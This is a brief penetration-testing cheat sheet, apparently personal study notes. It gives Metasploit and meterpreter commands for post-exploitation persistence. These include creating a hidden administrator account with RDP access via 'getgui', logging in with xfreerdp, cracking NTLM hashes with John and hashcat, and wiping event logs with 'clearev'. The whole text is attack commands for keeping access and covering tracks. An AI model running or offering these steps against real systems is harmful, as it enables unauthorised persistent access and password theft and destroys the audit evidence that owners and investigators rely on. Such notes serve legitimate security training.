MSF:
```
search persistence_service
```

# Persistence via RDP

```
#in meterpreter shell
run getgui -e -u user -p hacker_123321
```

GetGui command is designed to check RDP, create new user and start, hide login window and add user to local Administrator group, all in one service.

```
xfreerdp /u:user /p:hacker_123321 /v:[IP]
```

John NTLM hash cracking
```
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

hashcat:
```
hashcat -h | grep NTLM
-m1000
```


# Clearing
```
clearev
```

Also cleanup meterpreter service:
```
resource cleanup.rc
```